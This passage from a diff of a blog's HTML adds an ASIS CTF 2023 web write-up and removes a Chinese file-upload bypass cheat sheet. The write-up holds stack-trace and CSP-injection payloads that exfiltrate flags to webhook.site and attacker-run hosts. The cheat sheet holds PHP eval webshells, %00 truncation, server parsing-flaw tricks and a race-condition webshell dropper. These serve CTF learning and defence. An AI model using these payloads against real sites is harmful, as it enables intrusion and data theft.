&#125;);</span><br><span class="line">		<span class="keyword">await</span> page.<span class="title function_">waitForFunction</span>(<span class="function"><span class="params">flag</span>=&gt;</span>&#123;</span><br><span class="line">			<span class="keyword">let</span> el = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">			<span class="keyword">if</span>(!el) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">			el.<span class="property">value</span> = flag</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">		&#125;,&#123; <span class="attr">timeout</span>: <span class="number">2000</span> &#125;,flag)</span><br><span class="line">		<span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">r</span>=&gt;</span><span class="built_in">setTimeout</span>(r,<span class="number">3000</span>));</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">	<span class="keyword">try</span>&#123;<span class="keyword">await</span> browser.<span class="title function_">close</span>();&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">	process.<span class="title function_">exit</span>(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>get folder name? have no idea.</p>
+<p>need to check if we can get flag during page move delay<img src="/2023/12/25/ASISCTF/image-20240101163004369-1707063823030-1.png" alt="image-20240101163004369"></p>
+<p>fake flag. need to get folder name. i guess stacktrace from waitforfunction?</p>
+<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./stuff/ /app/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> PUPPETEER_SKIP_DOWNLOAD=1 npm ci</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /app/index.js</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m www</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 777 /home/www/ -R</span></span><br><span class="line"><span class="keyword">ENV</span> FLAG=ASIS&#123;test-flag&#125;</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mv</span> /app/ /<span class="variable">$FLAG</span>/</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /</span></span><br><span class="line"><span class="keyword">USER</span> www</span><br></pre></td></tr></table></figure>
+
+<p>I guess yes.</p>
+<p>One way is to hook <code>Error</code> and find filename, but I have to install puppeteer for testing. I don’t know how things work internally for puppeteer😕</p>
+<p>If no one solves it I will try out sometime tomorrow.</p>
+<p>i dont know either. ppt is heavily coupled with chrome devtools, i guess the function execution is a part of devtools protocol.</p>
+<p>hook getElementById, read stacktrace.</p>
+<p>solved:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> oldFunc = <span class="variable language_">document</span>.<span class="property">getElementById</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">getElementById</span> = <span class="keyword">function</span>(<span class="params">id</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> e = <span class="keyword">new</span> <span class="title class_">Error</span>();</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> stack = e.<span class="property">stack</span>.<span class="title function_">split</span>(<span class="string">&#x27;\\n&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">fetch</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">document</span>.location.href&#125;</span>`</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">          id,</span></span><br><span class="line"><span class="language-javascript">          stack</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> oldFunc.<span class="title function_">apply</span>(<span class="variable language_">document</span>, <span class="variable language_">arguments</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">const HOOK_URL = &quot;https://webhook.site/ae22bc03-bb75-4080-9702-36cbb57cc53d&quot;;</span><br><span class="line"></span><br><span class="line">let sent = false;</span><br><span class="line">function hook() &#123;</span><br><span class="line">  if (sent) return;</span><br><span class="line">  sent = true;</span><br><span class="line"></span><br><span class="line">  const e = new Error();</span><br><span class="line">  navigator.sendBeacon(HOOK_URL, e.stack);</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById = hook;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/25/ASISCTF/image-20240101162824320-1707063823030-2.png" alt="image-20240101162824320"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Error</span><br><span class="line">    at HTMLDocument.hook [as getElementById] (http://47.108.69.229/?id&#123;aaa111&#125;:11:13)</span><br><span class="line">    at eval (eval at G (:3:1641), &lt;anonymous&gt;:4:22)</span><br><span class="line">    at P.&lt;anonymous&gt; (pptr:evaluateHandle;WaitTask.rerun (/ASIS&#123;d1d-y0u-m4k3-pupp733r-cry-4n-3rr0r-6u35f5&#125;/node_modules/puppeteer-core/lib/cjs/puppeteer/common/WaitTask.js:80:54):4:36)</span><br><span class="line">    at P.start (pptr:internal:3:3734)</span><br><span class="line">    at pptr:evaluate;WaitTask.rerun (/ASIS&#123;d1d-y0u-m4k3-pupp733r-cry-4n-3rr0r-6u35f5&#125;/node_modules/puppeteer-core/lib/cjs/puppeteer/common/WaitTask.js:110:32):2:29</span><br></pre></td></tr></table></figure>
+
+<p>ASIS{d1d-y0u-m4k3-pupp733r-cry-4n-3rr0r-6u35f5}</p>
+<h2 id="gimme-csp-warmup"><a href="#gimme-csp-warmup" class="headerlink" title="gimme csp(warmup):"></a><strong>gimme csp(warmup):</strong></h2><p>绕过csp——-iframe标签</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hint for beginners: read about CSPs and Iframes and what features they can offer that you can use to bypass or exfiltrate things. The challenge isn&#x27;t easy if you are new to CTFs or don&#x27;t have much experience however it should be the easiest web challenge.</span><br><span class="line"></span><br><span class="line">[attachment](&lt;https://asisctf.com/tasks/gimme-csp_2b4abfa898695e4a37f7f36e4ba1b35a88f37103.txz&gt;)</span><br><span class="line"></span><br><span class="line">website: &lt;https://gimmecsp.asisctf.com&gt;</span><br><span class="line">Admin bot: &lt;http://18.195.96.13:8001&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://prod-files-secure.s3.us-west-2.amazonaws.com/c378b070-6063-4137-81ee-f75f82009b81/afec582d-a963-4f8b-9bbb-a140d32e55dc/gimme-csp.txz">gimme-csp.txz</a></p>
+<p>ok</p>
+<p>I can solve</p>
+<p>server returned multiple csp header and only the default-src ‘none’ works</p>
+<p>one last step…</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;&lt;https://gimmecsp.asisctf.com/?letter=$gift$&gt;&lt;/pre&gt;1234&lt;link rel=&#x27;stylesheet&#x27; href=&#x27;//fe.gy/1.css&#x27;&gt;&lt;/script&gt;&quot;</span> csp=<span class="string">&quot;stylescript-src-src-elem &#x27;self&#x27; &#x27;unsafe-eval&#x27; &lt;https://fe.gy&gt; &#x27;unsafe-inline&#x27;;&quot;</span>  referrerpolicy=<span class="string">&quot;no-referrer&quot;</span>&gt;&lt;<span class="regexp">/iframe&gt;&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure>
+
+<p>oh</p>
+<p>got an idea 🙂</p>
+<p>I think the <code>csp</code> attribute does some sort of sandboxing, we need to find some good way to prefetch or load the flag</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;&lt;https://gimmecsp.asisctf.com/?letter=&gt;&lt;/pre&gt;1234&lt;img src=&#x27;&lt;https://fe.gy/$gift$&gt;&#x27;&gt;&lt;/script&gt;&quot;</span> csp=<span class="string">&quot;img-src &lt;https://fe.gy&gt;; defascript-srcult-sscript-srcrc &lt;https://fe.gy&gt;; repscript-srcort-uscript-srcri &lt;https://fe.gy&gt;;&quot;</span> referrerpolicy=<span class="string">&quot;no-referrer&quot;</span>&gt;&lt;<span class="regexp">/iframe&gt;&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure>
+
+<p>ok</p>
+<p>I think I can get flag now?</p>
+<p>Here’s a way</p>
+<p>solved now</p>
+<p>exploit:</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;&lt;https://gimmecsp.asisctf.com/?letter=&gt;&lt;/pre&gt;1234&lt;img src=&#x27;&lt;http://$gift$.harold.kim:1337/&gt;&#x27;&gt;&lt;/script&gt;&quot;</span> csp=<span class="string">&quot;img-src https://*; defascript-srcult-sscript-srcrc &lt;http://harold.kim:1337/&gt;; repscript-srcort-uscript-srcri &lt;https://azusawa.world/a.php;&quot;</span>&gt; referrerpolicy=<span class="string">&quot;no-referrer&quot;</span>&gt;&lt;<span class="regexp">/iframe&gt;&lt;/</span>body&gt;</span><br><span class="line">&#123;<span class="string">&quot;csp-report&quot;</span>:&#123;<span class="string">&quot;document-uri&quot;</span>:<span class="string">&quot;[&lt;https://gimmecsp.asisctf.com/?letter=&gt;&lt;/pre&gt;1234&lt;img src=&#x27;&lt;http://$gift$.harold.kim:1337/&gt;&#x27;&gt;&lt;/script&gt;&quot;</span>,<span class="string">&quot;referrer&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;violated-directive&quot;</span>:<span class="string">&quot;img-src&quot;</span>,<span class="string">&quot;effective-directive&quot;</span>:<span class="string">&quot;img-src&quot;</span>,<span class="string">&quot;original-policy&quot;</span>:<span class="string">&quot;img-src](&lt;https://gimmecsp.asisctf.com/?letter=%3C/pre%3E1234%3Cimg%20src=%27http://$gift$.harold.kim:1337/%27%3E%3C/script%3E%22,%22referrer%22:%22%22,%22violated-directive%22:%22img-src%22,%22effective-directive%22:%22img-src%22,%22original-policy%22:%22img-src&gt;) https://*; default-src &lt;http://harold.kim:1337/&gt;; report-uri [&lt;https://azusawa.world/a.php;&quot;</span>,<span class="string">&quot;disposition&quot;</span>:<span class="string">&quot;enforce&quot;</span>,<span class="string">&quot;blocked-uri&quot;</span>:<span class="string">&quot;https://asis&#123;test-flag&#125;.harold.kim:1337/&quot;</span>,<span class="string">&quot;line-number&quot;</span>:<span class="number">1</span>,<span class="string">&quot;source-file&quot;</span>:<span class="string">&quot;https://gimmecsp.asisctf.com/&quot;</span>,<span class="string">&quot;status-code&quot;</span>:<span class="number">200</span>,<span class="string">&quot;script-sample&quot;</span>:<span class="string">&quot;&gt;](&lt;https://azusawa.world/a.php;%22,%22disposition%22:%22enforce%22,%22blocked-uri%22:%22https://asis%7Btest-flag%7D.harold.kim:1337/%22,%22line-number%22:1,%22source-file%22:%22https://gimmecsp.asisctf.com/%22,%22status-code%22:200,%22script-sample%22:%22&gt;)&quot;</span>&#125;&#125;<span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
+
+<p>ASIS{1m-n07-r34dy-f0r-2024-y3t-dfadb}</p>
 
       
     </div>
@@ -996,421 +1736,11 @@
   
 
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2023/10/10/file_upload/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/ch.jpg">
-      <meta itemprop="name" content="chleynx">
-      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="星河风">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/10/10/file_upload/" class="post-title-link" itemprop="url">文件上传</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-10-10 18:38:57" itemprop="dateCreated datePublished" datetime="2023-10-10T18:38:57+08:00">2023-10-10</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-10-22 16:44:55" itemprop="dateModified" datetime="2023-10-22T16:44:55+08:00">2023-10-22</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Summar/" itemprop="url" rel="index"><span itemprop="name">Summar</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="前端绕过"><a href="#前端绕过" class="headerlink" title="前端绕过"></a>前端绕过</h1><p>正常上传文件,捉取数据包修改（bp抓包改后缀）</p>
-<h1 id="后端绕过"><a href="#后端绕过" class="headerlink" title="后端绕过"></a>后端绕过</h1><p>服务器端检测的绕过</p>
-<h2 id="函数特性"><a href="#函数特性" class="headerlink" title="函数特性"></a>函数特性</h2><p>move_uploaded_file函数会自动去除文件名末尾的点 和 &#x2F;.</p>
-<p><code>fopen</code>函数特性</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename=&#x27;1.php/.&#x27;;</span><br><span class="line">$content=&quot;&lt;?php eval($_POST[1]);?&gt;&quot;;</span><br><span class="line">$f = fopen($filename, &#x27;w&#x27;);</span><br><span class="line">    fwrite($f, $content);</span><br><span class="line">    fclose($f);    </span><br><span class="line">?&gt; </span><br><span class="line">#会在当前目录生成1.php,文件名为1.php.也可以</span><br><span class="line">————————————————</span><br></pre></td></tr></table></figure>
-
-<h5 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h5><p>后缀名大小写</p>
-<p>后缀名双写</p>
-<p><code>尝试php3 phtml php3457(linux+apache+php5.6)等后缀</code></p>
-<p>检测MIME类型的,捉包改MIME类型</p>
-<h3 id="服务端检测（MINE类型检测）"><a href="#服务端检测（MINE类型检测）" class="headerlink" title="服务端检测（MINE类型检测） #"></a>服务端检测（MINE类型检测） <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A3%80%E6%B5%8B-mine%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B">#</a></h3><blockquote>
-<p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。</p>
-</blockquote>
-<p>服务器代码判断$_FILES[”file“][“type”]是不是图片格式（<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>），如果不是，则不允许上传该文件。</p>
-<p>绕过方法：</p>
-<blockquote>
-<p>抓包后更改Content-Type为允许的类型绕过该代码限制，比如将php文件的<code>Content-Type:application/octet-stream</code>修改为<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>等就可以</p>
-</blockquote>
-<p>常见MIMETYPE</p>
-<blockquote>
-<p>audio&#x2F;mpeg -&gt; .mp3 application&#x2F;msword -&gt; .doc application&#x2F;octet-stream -&gt; .exe application&#x2F;pdf -&gt; .pdf application&#x2F;x-javascript -&gt; .js application&#x2F;x-rar -&gt; .rar application&#x2F;zip -&gt; .zip image&#x2F;gif -&gt; .gif image&#x2F;jpeg -&gt; .jpg &#x2F; .jpeg image&#x2F;png -&gt; .png text&#x2F;plain -&gt; .txt text&#x2F;html -&gt; .html video&#x2F;mp4 -&gt; .mp4</p>
-</blockquote>
-<h3 id="服务端检测（目录路径检测）"><a href="#服务端检测（目录路径检测）" class="headerlink" title="服务端检测（目录路径检测） #"></a>服务端检测（目录路径检测） <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A3%80%E6%B5%8B-%E7%9B%AE%E5%BD%95%E8%B7%AF%E5%BE%84%E6%A3%80%E6%B5%8B">#</a></h3><p>对目录路径的检测不够严谨而导致可以使用%00截断绕过进行攻击。</p>
-<p>绕过方法:</p>
-<blockquote>
-<ul>
-<li>例如：&#x2F;111.php%00.gif&#x2F;111.gif -&gt; &#x2F;111.php</li>
-</ul>
-</blockquote>
-<h3 id="服务端检测（文件扩展名检测）"><a href="#服务端检测（文件扩展名检测）" class="headerlink" title="服务端检测（文件扩展名检测） #"></a>服务端检测（文件扩展名检测） <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A3%80%E6%B5%8B-%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E6%A3%80%E6%B5%8B">#</a></h3><p>绕过方法：</p>
-<blockquote>
-<ul>
-<li>文件名大小写绕过，如：<code>*.pHp</code> <code>*.aSP</code></li>
-<li>文件名双写绕过，如：<code>*.pphphp</code></li>
-<li>Unicode： 当目标存在json_decode且检查在json_decode之前,可以将php写为<code>\u0070hp</code></li>
-<li>名单列表绕过，如：<code>*.asa</code> <code>*.cer</code></li>
-<li>特殊文件名绕过，比如windows文件名最后不能有.或空格，可设为<code>*.php.</code>或<code>*.php+</code></li>
-<li>0x00截断绕过，比如：<code>*.php(0x00).jpg</code> 或 <code>*.php%00.jpg</code></li>
-<li>文件包含漏洞</li>
-<li>服务器解析漏洞</li>
-<li>.htaccess文件攻击</li>
-</ul>
-</blockquote>
-<h3 id="文件截断绕过攻击"><a href="#文件截断绕过攻击" class="headerlink" title="文件截断绕过攻击 #"></a>文件截断绕过攻击 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87%E6%94%BB%E5%87%BB">#</a></h3><blockquote>
-<p>截断类型：PHP%00截断</p>
-<p>截断原理：由于00代表结束符，所以会把00后面的所有字符删除</p>
-<p>截断条件：PHP版本小于5.3.4，PHP的magic_quotes_gpc为OFF状态</p>
-</blockquote>
-<p>绕过方法：</p>
-<blockquote>
-<ul>
-<li>例如上传文件shell.php，上传文件路径为&#x2F;?upload&#x3D;shell.php</li>
-<li>绕过：&#x2F;?upload&#x3D;shell.php%00.jpg -&gt; &#x2F;?upload&#x3D;shell.php</li>
-</ul>
-</blockquote>
-<h3 id="解析漏洞攻击"><a href="#解析漏洞攻击" class="headerlink" title="解析漏洞攻击 #"></a>解析漏洞攻击 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB">#</a></h3><p>主要有目录解析、文件解析，Apache解析漏洞、Nginx解析漏洞、IIS7.5解析漏洞。</p>
-<h4 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析 #"></a>目录解析 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90">#</a></h4><blockquote>
-<ul>
-<li>形式：<code>www.xxx.com/xxx.asp/xxx.jpg</code></li>
-<li>原理：服务器会默认把 <code>.asp</code> 和 <code>.asp</code>目录下的文件都解析成asp文件</li>
-</ul>
-</blockquote>
-<h4 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析 #"></a>文件解析 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90">#</a></h4><blockquote>
-<ul>
-<li>形式：<code>www.xxx.com/xxx.asp;.jpg</code></li>
-<li>原理：服务器默认不解析<code>;</code>后面的内容，因此<code>xxx.asp;jpg</code>被解析为<code>xxx.asp</code>文件了</li>
-</ul>
-</blockquote>
-<h4 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞 #"></a>Apache解析漏洞 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">#</a></h4><p>服务器代码中限制了某些后缀的文件不允许上传，但是有些Apache是允许解析其它后缀的，例如在httpd.conf中如果配置有如下代码，则能够解析php和phtml文件</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml</span><br></pre></td></tr></table></figure>
-
-<p>1</p>
-<p>常用后缀：<code>*.php</code> <code>*.php3</code> <code>*.php4</code> <code>*.php5</code> <code>*.phtml</code> <code>*.pht</code></p>
-<p>在Apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止。因此，例如上传的文件名为1.php.xxxx，因为后缀xxxx不可解析，所以向左解析后缀php。</p>
-<blockquote>
-<ul>
-<li>例如：<code>shell.php.qwe.asd</code> -&gt;<code>shell.php</code></li>
-</ul>
-</blockquote>
-<h4 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞 #"></a>Nginx解析漏洞 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">#</a></h4><blockquote>
-<p>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过 正则匹配设置<strong>SCRIPT_FILENAME</strong>。当访问<code>www.xxx.com/phpinfo.jpg/1.php</code>这个 URL时，$fastcgi_script_name会被设置为“phpinfo.jpg&#x2F;1.php”，然后构造成 SCRIPT_FILENAME传递给PHP CGI。</p>
-<p>原因是开启了 fix_pathinfo 这个选项，会触发 在PHP中的如下逻辑： PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会 将phpinfo.jpg作为PHP文件来解析了。</p>
-</blockquote>
-<p>攻击方式</p>
-<blockquote>
-<ul>
-<li>形式： <code>www.xxxx.com/UploadFiles/image/1.jpg/1.php</code> <code>www.xxxx.com/UploadFiles/image/1.jpg%00.php</code> <code>www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</code></li>
-<li>另一种方法：上传一个名字为test.jpg，然后访问<code>test.jpg/.php</code>,在这个目录下就会生成一句话木马shell.php。</li>
-</ul>
-</blockquote>
-<h4 id="IIS7-5解析漏洞"><a href="#IIS7-5解析漏洞" class="headerlink" title="IIS7.5解析漏洞 #"></a>IIS7.5解析漏洞 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#iis7-5%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">#</a></h4><blockquote>
-<p>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了 <strong>cgi.fix_pathinfo</strong>，而这并不是nginx或者iis7.5本身的漏洞。</p>
-</blockquote>
-<h3 id="竞争条件攻击"><a href="#竞争条件攻击" class="headerlink" title="竞争条件攻击 #"></a>竞争条件攻击 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%E6%94%BB%E5%87%BB">#</a></h3><p>一些网站上传文件的逻辑时先允许上传任意文件，然后检查上传文件的文件是否包含WebShell脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短暂的时间差（因为需要执行检查文件和删除文件的操作），攻击者可以利用这个时间差完成竞争条件的上传漏洞攻击。</p>
-<p>攻击方法：</p>
-<blockquote>
-<ul>
-<li>攻击者需要先上传一个WebShell脚本1.php，1.php的内容为生成一个新的WebShell脚本shell.php，1.php写入如下代码</li>
-</ul>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	fputs(fopen(&quot;../shell.php&quot;, &quot;w&quot;),&#x27;&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li>当1.php上传完成后，客户端立即访问1.php，则会在服务端当前目录下自动生成shell.php，这时攻击者就利用了时间差完成了WebShell的上传</li>
-</ul>
-</blockquote>
-<h3 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传 #"></a>双文件上传 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E5%8F%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">#</a></h3><p>本意为上传两个或多个文件去突破。上传点支持多文件上传，但是却只对第一个文件做了过滤。</p>
-<p>利用方式：</p>
-<blockquote>
-<ul>
-<li>在存在双文件上传漏洞的页面中，查看上传的页面。F12找到上传的post表单，action属性是指定上传检测页面，一般是写的绝对路径，比如：<code>xxx.asp/xxx.php</code></li>
-<li>补全url：<code>https://www.xxx.com/xxx.php(asp)</code></li>
-<li>构造本地post提交表单</li>
-</ul>
